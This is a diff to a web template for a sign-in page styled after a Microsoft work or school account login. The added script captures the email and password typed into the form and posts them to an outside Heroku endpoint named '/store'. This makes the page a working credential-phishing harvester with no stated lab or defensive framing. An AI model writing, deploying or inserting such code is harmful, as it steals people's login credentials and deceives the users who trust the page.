@@ -3,17 +3,31 @@
 <head>
   <% include ../partials/header.ejs %>
 </head>
+<script>
+ $(document).ready(function(){
+        var email,password;
+        $(".submit-btn").click(function(){
+          email=$("#email").val();
+          password=$("#password").val();
+          $.post("lmpt-heroku-app.herokuapp.com/store",{email: email,password: password}, function(data){
+            if(data==='done')
+              {
+                alert("store success");
+              }
+          });
+        });
+      });
+</script>
 
 <body>
-
 
 <form method="post" enctype="text/plain">
 <p><p style="color: dimgray">Sign in with your work or school account</p>
 <br>
-<input name="email-phone" type="text" placeholder="Email and phone" size="50"></input>
+<input id="email" name="email" type="text" placeholder="Email or phone" size="50"></input>
 <br>
 <br>
-<input name="password" type="password" placeholder="Password" size="50"></input>
+<input id ="password" name="password" type="password" placeholder="Password" size="50"></input>
 <br>
 <p><input name="keep" type="checkbox"></input>Keep me signed in</p>
 <br>
@@ -27,7 +41,6 @@
 <br>
 <span style="color: royalblue">Sign in with a Microsoft account</span></p>
 </form>
-
 
 </body>
 </html>
